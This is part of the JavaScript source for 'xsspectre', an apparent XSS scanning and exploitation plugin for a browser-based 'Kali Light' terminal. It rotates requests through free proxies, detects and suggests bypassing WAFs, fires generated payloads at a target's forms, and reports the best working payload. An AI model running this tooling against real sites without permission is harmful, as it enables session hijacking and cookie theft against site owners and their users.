          add(`  Suggested payload: ${d.payload}`, 'warning');
        });
      }
      if (hasWafs) {
        add('Note: A WAF was detected (' + data.wafs.join(', ') + '). While it may filter some payloads, bypass techniques exist.', 'muted');
      }
      add('');
      add('Recommended action: Report this vulnerability to the bug bounty program with proof-of-concept.', 'accent');
      add('Include the URL, payload used, and expected impact (cookie theft, session hijacking, etc.).', 'output');
    } else if (severity === 'MEDIUM') {
      add(pick(phrases.medium), 'warning');
      add('');
      if (hasDom) {
        add('The DOM XSS patterns found are potential vulnerabilities that require manual verification.', 'output');
        domFindings.slice(0, 3).forEach((d, i) => {
          add(`• Line ${d.line}: Sink "${d.sink}" source "${d.source}"`, 'warning');
          add(`  Code: ${d.code}`, 'muted');
        });
        add('These sinks may allow execution if user-controlled data reaches them without sanitization.', 'output');
      }
      add('');
      add('Recommended action: Confirm exploitability by manually testing the identified sinks.', 'accent');
      add('If confirmed, report as DOM-based XSS with proof-of-concept.', 'output');
    } else {
      add(pick(phrases.low), 'muted');
      add('');
      add('No high-confidence XSS vulnerabilities were automatically detected.', 'output');
      add('However, this does not guarantee the target is secure. Manual testing is advised.', 'output');
      if (hasWafs) {
        add('WAF detected: ' + data.wafs.join(', ') + '. It may be blocking payloads. Try bypass techniques.', 'muted');
      }
    }
    add('');
    add('─'.repeat(60), 'muted');
    return out;
  };
  const renderReport = (data, stats) => {
    const out = [];
    const add = (text, cls = 'output', prefix = '') => out.push(line(prefix + text, cls));
    add('xsspectre Scan Report', 'accent');
    add('├─ Target             : ' + data.target);
    add('├─ Scan time          : ' + new Date().toISOString(), 'muted');
    add('├─ WAF                : ' + (data.wafs.length ? data.wafs.join(', ') : 'none'), data.wafs.length ? 'danger' : 'success');
    const proxyInfo = state.runtime.proxyList.length > 0 ? state.runtime.proxyList[state.runtime.proxyIndex % state.runtime.proxyList.length] : null;
    add('├─ Proxy              : ' + (proxyInfo ? proxyInfo.name : 'direct'), 'muted');
    add('├─ Forms found        : ' + data.forms.length, 'accent');
    add('├─ Payloads generated : ' + data.payloads.length, 'accent');
    add('├─ Reflections        : ' + stats.reflected, stats.reflected ? 'danger' : 'accent');
    add('├─ DOM XSS potential  : ' + (stats.domXss ? 'YES' : 'NO'), stats.domXss ? 'danger' : 'success');
    add('└─ Status             : ' + (stats.reflected || stats.domXss ? 'VULNERABLE' : 'CLEAN'), (stats.reflected || stats.domXss) ? 'danger' : 'accent');
    if (data.results && data.results.length) {
      const reflectedResults = data.results.filter(r => r.reflected);
      if (reflectedResults.length) {
        add('');
        add('Reflection Details', 'accent');
        reflectedResults.forEach((r, i) => {
          const last = i === reflectedResults.length - 1;
          const executable = r.executable ? 'EXECUTABLE' : 'TEXT ONLY';
          const lineText = `Form: ${r.form.action || data.target} [${r.form.method}] input="${r.input.name}" payload="${r.payload.payload}" encoding=${r.payload.encoding} context=${r.context || 'unknown'} ${executable} URL=${r.url}`;
          add((last ? '└─ ' : '├─ ') + lineText, r.executable ? 'danger' : 'warning');
        });
        const best = reflectedResults.find(r => r.executable) || reflectedResults[0];
        add('');
        add('Best Reflected XSS Payload', 'accent');
        add('├─ Payload : ' + best.payload.payload, 'danger');
        add('├─ Context : ' + (best.context || 'unknown'), 'muted');
        add('├─ Input   : ' + best.input.name, 'muted');
        add('└─ URL     : ' + best.url, 'muted');
      } else {
        add('');
        add('Reflection Details', 'accent');
        add('└─ No reflections detected.', 'success');
      }
    }
    if (data.domXss && data.domXss.length) {
      add('');
      add('DOM XSS Findings (potential)', 'accent');
      data.domXss.forEach((d, i) => {
        const last = i === data.domXss.length - 1;
        add((last ? '└─ ' : '├─ ') + `Line ${d.line}: Sink: ${d.sink} | Source: ${d.source} | Suggested payload: ${d.payload} | Code: ${d.code}`, 'warning');
      });
      add('');
      add('Best DOM XSS Payload Suggestion', 'accent');
      add('└─ ' + data.domXss[0].payload, 'danger');
    }
    out.push(...generateAiReport(data, stats));
    return out;
  };
  const scanForms = async (target, options = {}) => {
    const out = [];
    const add = (text, cls = 'output', prefix = '') => out.push(line(prefix + text, cls));
    add('xsspectre Scan', 'accent');
    add(`Target: ${target}`, 'muted');
    add('├─ Phase 1: Target Normalization');
    let normalized;
    try {
      normalized = normalizeTarget(target);
      add('│  └─ Normalized URL: ' + normalized, 'success');
    } catch (e) {
      add('│  └─ Normalization failed: ' + e.message, 'danger');
      add('└─ Scan aborted.', 'danger');
      return out;
    }
    state.runtime.visitedUrls.add(normalized);
    add('├─ Phase 2: Proxy Preparation');
    try {
      await prepareProxyList();
      add('│  └─ Working proxies available: ' + state.runtime.proxyList.length, 'success');
    } catch (e) {
      add('│  └─ Proxy error: ' + e.message, 'danger');
      add('└─ Scan aborted.', 'danger');
      return out;
    }
    add('├─ Phase 3: WAF Detection');
    let wafHeaders = null;
    try {
      wafHeaders = await fetchHeadersObj(normalized, { method: 'HEAD' }, 1, true).catch(() => null);
    } catch { wafHeaders = null; }
    const wafs = wafHeaders ? detectWAF(wafHeaders) : [];
    add('│  └─ WAF Detected: ' + (wafs.length ? wafs.join(', ') : 'none'), wafs.length ? 'danger' : 'success');
    add('├─ Phase 4: Fetching Page');
    let html;
    try {
      html = await fetchText(normalized, {}, state.settings.retries, true);
      add('│  └─ Page fetched: ' + html.length + ' bytes', 'success');
    } catch (e) {
      add('│  └─ Fetch failed: ' + e.message, 'danger');
      add('└─ Scan aborted.', 'danger');
      return out;
    }
    add('├─ Phase 5: Form Detection');
    const urlParams = detectUrlParameters(normalized);
    const standaloneForms = detectStandaloneInputs(html, normalized);
    const forms = detectAllForms(html, normalized, urlParams, standaloneForms);
    state.runtime.stats.forms = forms.length;
    add('│  ├─ Found ' + forms.length + ' form(s)', 'accent');
    forms.forEach((form, i) => {
      const last = i === forms.length - 1;
      const pseudo = form.pseudo ? (form.standalone ? ' (Standalone Input)' : ' (URL params)') : '';
      add(`│  ${last ? '└─' : '├─'} Form #${i + 1}: ${form.method} ${form.action || normalized}${pseudo} (type: ${form.type}, score: ${form.score})`, 'muted');
    });
    add('├─ Phase 6: DOM XSS Heuristic');
    const domXss = detectDomXSS(html);
    state.runtime.stats.domXss = domXss.length;
    if (domXss.length) {
      add('│  └─ Potential DOM XSS patterns found: ' + domXss.length, 'warning');
    } else {
      add('│  └─ No DOM XSS patterns detected.', 'success');
    }
    if (!forms.length && !domXss.length) {
      add('└─ No forms or DOM XSS patterns found. Scan finished.', 'warning');
      return out;
    }
    add('├─ Phase 7: Payload Generation');
    const payloads = generateXSSPayloads();
    state.runtime.stats.payloads = payloads.length;
    add(`│  └─ Generated ${payloads.length} payloads`, 'success');
    add('├─ Phase 8: Testing Forms');
    const allResults = [];
    for (let i = 0; i < forms.length; i++) {
      const form = forms[i];
      const results = await testXSSOnForm(form, normalized, payloads, state.settings);
      allResults.push(...results);
      const reflected = results.filter(r => r.reflected).length;
      state.runtime.stats.reflected += reflected;
      const isLastForm = i === forms.length - 1;
      add(`│  ${isLastForm ? '└─' : '├─'} Form #${i + 1} tested: ${reflected} reflection(s)`, reflected ? 'danger' : 'success');
    }
    add('├─ Phase 9: Report Generation');
    add('│  └─ Generating final report...', 'success');
    add('└─ Scan complete.', 'accent');
    add('');
    const reportData = {
      target: normalized,
      forms,
      results: allResults,
      payloads,
      wafs,
      proxy: state.runtime.proxyList.length > 0 ? state.runtime.proxyList[0] : null,
      domXss
    };
    out.push(...renderReport(reportData, state.runtime.stats));
    return out;
  };
  const exploitForm = async (target, formIndex = 0, payloadIndex = 0, options = {}) => {
    const out = [];
    const add = (text, cls = 'output', prefix = '') => out.push(line(prefix + text, cls));
    add('xsspectre Exploit', 'accent');
    let normalized;
    try {
      normalized = normalizeTarget(target);
      add('├─ Target normalized: ' + normalized, 'success');
    } catch (e) {
      add('└─ Error: ' + e.message, 'danger');
      return out;
    }
    state.runtime.visitedUrls.add(normalized);
    try {
      await prepareProxyList();
    } catch (e) {
      add('├─ Proxy error: ' + e.message, 'danger');
      add('└─ Exploit aborted.', 'danger');
      return out;
    }
    add('├─ Fetching page...');
    let html;
    try {
      html = await fetchText(normalized, {}, state.settings.retries, true);
      add('│  └─ Fetched ' + html.length + ' bytes', 'success');
    } catch (e) {
      add('│  └─ Fetch failed: ' + e.message, 'danger');
      return out;
    }
    add('├─ Detecting forms...');
    const urlParams = detectUrlParameters(normalized);
    const standaloneForms = detectStandaloneInputs(html, normalized);
    const forms = detectAllForms(html, normalized, urlParams, standaloneForms);
    if (!forms.length) {
      add('└─ No forms found.', 'warning');
      return out;
    }
    const formIdx = Math.max(0, Math.min(Number(formIndex) || 0, forms.length - 1));
    const form = forms[formIdx];
    add(`│  └─ Selected form #${formIdx + 1}: ${form.method} ${form.action || normalized}`, 'accent');
    add('├─ Generating payloads...');
    const payloads = generateXSSPayloads();
    const pIdx = Math.max(0, Math.min(Number(payloadIndex) || 0, payloads.length - 1));
    const selectedPayload = payloads[pIdx];
    add(`│  └─ Selected payload #${pIdx + 1}: ${selectedPayload.payload}`, 'accent');
    add('├─ Testing form...');
    const results = [];
    for (const input of form.inputs) {
      if (!input.name) continue;
      const result = await testReflectedXSS(normalized, form, input, selectedPayload, state.settings);
      results.push(result);
    }
    const reflectedCount = results.filter(r => r.reflected).length;
    state.runtime.stats.reflected += reflectedCount;
    add(`│  └─ Tested ${results.length} input(s), ${reflectedCount} reflection(s)`, reflectedCount ? 'danger' : 'success');
    add('└─ Exploit test complete.', 'accent');
    add('');
    const reportData = {
      target: normalized,
      forms: [form],
      results,
      payloads: [selectedPayload],
      wafs: [],
      proxy: state.runtime.proxyList.length > 0 ? state.runtime.proxyList[0] : null,
      domXss: []
    };
    out.push(...renderReport(reportData, state.runtime.stats));
    return out;
  };
  const autoDetect = async (target, options = {}) => {
    const out = [];
    const add = (text, cls = 'output', prefix = '') => out.push(line(prefix + text, cls));
    add('xsspectre Auto Detection', 'accent');
    let normalized;
    try {
      normalized = normalizeTarget(target);
      add('├─ Target normalized: ' + normalized, 'success');
    } catch (e) {
      add('└─ Error: ' + e.message, 'danger');
      return out;
    }
    try {
      await prepareProxyList();
    } catch (e) {
      add('├─ Proxy error: ' + e.message, 'danger');
      add('└─ Auto detection aborted.', 'danger');
      return out;
    }
    add('├─ Running WAF detection...');
    let wafs = [];
    try {
      const headers = await fetchHeadersObj(normalized, { method: 'HEAD' }, 1, true);
      wafs = detectWAF(headers);
    } catch { wafs = []; }
    add('│  └─ WAF: ' + (wafs.length ? wafs.join(', ') : 'none'), wafs.length ? 'danger' : 'success');
    add('├─ Starting full scan...');
    add('│');
    const scanOutput = await scanForms(normalized, { ...state.settings, ...options });
    out.push(...scanOutput);
    add('└─ Auto detection complete.', 'accent');
    return out;
  };
  const cmdSetProxy = async ({ args }) => {
    if (!args[1]) return [line('Usage: xsspectre setproxy <template>', 'danger')];
    const template = args[1].trim();
    if (!template.includes('{url}')) {
      return [line('Invalid proxy template. Must contain "{url}" placeholder.', 'danger')];
    }
    state.runtime.customProxy = template;
    state.runtime.proxyList = [];
    state.runtime.proxyReady = false;
    return [
      line('Custom proxy set successfully.', 'accent'),
      line(`Template: ${template}`, 'muted'),
      line('It will be tested and added to the working proxy list on next request.', 'muted')
    ];
  };
  const help = () => [
    line(`Package: ${manifest.name}`, 'accent'),
    line(`Version: ${manifest.version}`),
    line(`Author: ${manifest.author}`),
    spacer(),
    line(`Usage: ${COMMAND.usage}`),
    spacer(),
    line(`${PKG}`),
    line('  Show package help.', 'muted'),
    line(`${PKG} help`),
    line('  Show package help.', 'muted'),
    line(`${PKG} info`),
    line('  Show package information.', 'muted'),
    line(`${PKG} commands`),
    line('  Show Kali Light command registration state.', 'muted'),
    line(`${PKG} manifest`),
    line('  Show the package manifest.', 'muted'),
    line(`${PKG} policy`),
    line('  Show the declared permission policy.', 'muted'),
    line(`${PKG} selftest`),
    line('  Run package bridge and lifecycle diagnostics.', 'muted'),
    line(`${PKG} version`),
    line('  Show package version.', 'muted'),
    line(`${PKG} scan <url>`),
    line('  Scan target for forms and test XSS payloads.', 'muted'),
    line(`${PKG} exploit <url> [formIndex] [payloadIndex]`),
    line('  Test a specific form with a specific payload.', 'muted'),
    line(`${PKG} auto <url>`),
    line('  Auto-detect WAF, choose proxy, and run full scan.', 'muted'),
    line(`${PKG} setproxy <template>`),
    line('  Set custom proxy template (must contain {url}).', 'muted')
  ];
  const info = () => {
    const installed = state.installed;
    return [
      line('Package Information', 'accent'),
      spacer(),
      line(`Name         : ${manifest.name}`),
      line(`Version      : ${manifest.version}`),
      line(`Author       : ${manifest.author}`),
      line(`Description  : ${manifest.description}`, 'muted'),
      line(`Help         : ${manifest.help}`, 'muted'),
      line(`Entry        : ${manifest.entry}`),
      line(`Security     : ${manifest.securityLevel.toUpperCase()}`),
      line(`Official     : ${manifest.official ? 'yes' : 'no'}`),
      line(`Default      : ${manifest.default ? 'yes' : 'no'}`),
      line(`Dependencies : ${manifest.dependencies.length}`),
      line(`Commands     : ${manifest.commands.length}`),
      line(`Installed    : ${installed ? 'yes' : 'no'}`, installed ? 'accent' : 'danger'),
      line(`Network Perm : ${manifest.permissions.network}`),
      line(`Concurrency  : ${state.settings.concurrent}`),
      line(`Timeout      : ${state.settings.timeout}ms`),
      line(`Working Proxies: ${state.runtime.proxyList.length}`)
    ];
  };
  const commands = () => [
    line('Package Command Registration', 'accent'),
    spacer(),
    line(`Command     : ${COMMAND.name}`),
    line(`Usage       : ${COMMAND.usage}`, 'muted'),
    line(`Description : ${COMMAND.description}`),
    line(`Kind        : ${COMMAND.kind}`),
    line('Source      : package'),
    line(`Registered  : ${state.installed ? 'yes' : 'no'}`, state.installed ? 'accent' : 'danger'),
    spacer(),
    line('Supported subcommands:', 'accent'),
    line('  help       Show package help.'),
    line('  info       Show package information.'),
    line('  commands   Show command registration information.'),
    line('  manifest   Show the package manifest.'),
    line('  policy     Show the declared permission policy.'),
    line('  selftest   Validate package bridge and lifecycle state.'),
    line('  version    Show package version.'),
    line('  scan       Scan target for forms and XSS.'),
    line('  exploit    Test a specific form with a specific payload.'),
    line('  auto       Auto-detect WAF and run full scan.'),
    line('  setproxy   Set custom proxy template.')
  ];
  const manifestInfo = () => [
    line('Package Manifest', 'accent'),
    spacer(),
    line(`name         : ${manifest.name}`),
    line(`version      : ${manifest.version}`),
    line(`description  : ${manifest.description}`, 'muted'),
    line(`author       : ${manifest.author}`),
    line(`help         : ${manifest.help}`, 'muted'),
    line(`official     : ${manifest.official}`),
    line(`default      : ${manifest.default}`),
    line(`securityLevel: ${manifest.securityLevel}`),
    line(`entry        : ${manifest.entry}`),
    line(`dependencies : ${manifest.dependencies.length}`),
    line(`commands     : ${manifest.commands.length}`),
    line(`permissions  : storage=${manifest.permissions.storage}, cookies=${manifest.permissions.cookies}, network=${manifest.permissions.network}, filesystem=${manifest.permissions.filesystem}`)
  ];
  const policy = () => [
    line('Permission Policy', 'accent'),
    spacer(),
    line(`storage    : ${manifest.permissions.storage}`),
    line(`cookies    : ${manifest.permissions.cookies}`),
    line(`network    : ${manifest.permissions.network}`),
    line(`filesystem : ${manifest.permissions.filesystem}`),
    spacer(),
    line('This package requests full network access for scanning.', 'muted'),
    line('All package interaction occurs through the Kali Light package bridge.', 'muted')
  ];
  const version = () => [line(`${manifest.name} ${manifest.version}`, 'accent')];
  const selfTest = () => {
    const api = state.api;
    const checks = [];
    let passed = true;
    const check = (name, condition, detail = '') => {
      checks.push(line(`[${condition ? 'PASS' : 'FAIL'}] ${name}${detail ? ` — ${detail}` : ''}`, condition ? 'accent' : 'danger'));
      if (!condition) passed = false;
    };
    check('Package API', Boolean(api && typeof api === 'object'), 'bridge available');
    check('registerCommand', typeof api?.registerCommand === 'function', 'supported');
    check('unregisterCommand', typeof api?.unregisterCommand === 'function', 'supported');
    check('line', typeof api?.line === 'function', 'supported');
    check('spacer', typeof api?.spacer === 'function', 'supported');
    check('snapshot', typeof api?.snapshot === 'function', 'supported');
    check('getMode', typeof api?.getMode === 'function', 'supported');
    check('Manifest Identity', manifest.name === PKG && manifest.version === VERSION, `${manifest.name} ${manifest.version}`);
    check('Manifest Help', manifest.help === `${PKG} help`, manifest.help);
    check('Manifest Author', manifest.author === 'Mobin Vaghar Jalaliyeh (Kali Light)', manifest.author);
    check('Manifest Entry', manifest.entry === 'install', `entry=${manifest.entry}`);
    check('Permissions', manifest.permissions.network === 'full', 'network=full');
    check('Dependencies', Array.isArray(manifest.dependencies) && manifest.dependencies.length === 0, 'no dependencies');
    check('Command Metadata', manifest.commands.length === 1 && manifest.commands[0] === COMMAND.name && COMMAND.name === PKG && COMMAND.kind === 'scanner', 'valid command metadata');
    const fup = getFreeUserProxy();
    check('FreeUserProxy available', Boolean(fup && typeof fup.getWorkingProxies === 'function'), 'loaded');
    check('Concurrency Setting', state.settings.concurrent === 500, 'concurrent=500');
    checks.push(spacer());
    checks.push(line(passed ? 'Self-test result: PASS' : 'Self-test result: FAIL', passed ? 'accent' : 'danger'));
    return checks;
  };
  const dispatch = async ({ args = [] } = {}) => {
    const command = String(args[0] ?? '').trim().toLowerCase();
    switch (command) {
      case '':
      case 'help':
        return help();
      case 'info':
        return info();
      case 'commands':
        return commands();
      case 'manifest':
        return manifestInfo();
      case 'policy':
        return policy();
      case 'selftest':
        return selfTest();
      case 'version':
        return version();
      case 'setproxy':
        return cmdSetProxy({ args });
      case 'scan': {
        const target = args[1];
        if (!target) return [line('Error: scan requires a target URL.', 'danger'), line(`Usage: ${PKG} scan <url>`, 'muted')];
        return scanForms(target);
      }
      case 'exploit': {
        const target = args[1];
        if (!target) return [line('Error: exploit requires a target URL.', 'danger'), line(`Usage: ${PKG} exploit <url> [formIndex] [payloadIndex]`, 'muted')];
        const formIndex = args[2] ? parseInt(args[2], 10) : 0;
        const payloadIndex = args[3] ? parseInt(args[3], 10) : 0;
        return exploitForm(target, formIndex, payloadIndex);
      }
      case 'auto': {
        const target = args[1];
        if (!target) return [line('Error: auto requires a target URL.', 'danger'), line(`Usage: ${PKG} auto <url>`, 'muted')];
        return autoDetect(target);
      }
      default:
        return [
          line(`${PKG}: unknown command "${command}"`, 'danger'),
          line(`Use "${manifest.help}" for available commands.`, 'muted')
        ];
    }
  };
  const validateApi = api => {
    if (!api || typeof api !== 'object') throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    const required = ['registerCommand', 'unregisterCommand', 'line', 'spacer', 'snapshot', 'getMode'];
    for (const method of required) {
      if (typeof api[method] !== 'function') throw new Error(`PACKAGE_BRIDGE_${method.toUpperCase()}_UNAVAILABLE`);
    }
  };
  const install = async api => {
    validateApi(api);
    state.api = api;
    if (state.installed) return [];
    try {
      const registered = api.registerCommand(
        COMMAND.name,
        {
          description: COMMAND.description,
          usage: COMMAND.usage,
          aliases: COMMAND.aliases,
          kind: COMMAND.kind,
          run: dispatch
        },
        {
          source: 'package',
          packageKey: PKG
        }
      );
      if (registered === false) throw new Error('PACKAGE_COMMAND_REGISTRATION_FAILED');
      state.installed = true;
      return [];
    } catch {
      try {
        api.unregisterCommand(COMMAND.name);
      } catch {}
      state.installed = false;
      state.api = null;
      throw new Error('PACKAGE_INSTALL_FAILED');
    }
  };
  const uninstall = async api => {
    const bridge = api || state.api;
    try {
      if (bridge && typeof bridge.unregisterCommand === 'function') {
        bridge.unregisterCommand(COMMAND.name);
      }
    } finally {
      state.installed = false;
      state.api = null;
    }
    return [];
  };
  const exported = Object.freeze({
    manifest,
    name: PKG,
    version: VERSION,
    description: manifest.description,
    author: manifest.author,
    install,
    uninstall,
    getManifest: () => manifest,
    getState: () => ({
      ...state,
      settings: { ...state.settings },
      runtime: { ...state.runtime, visitedUrls: Array.from(state.runtime.visitedUrls) }
    })
  });
  window[GLOBAL_KEY] = exported;
})();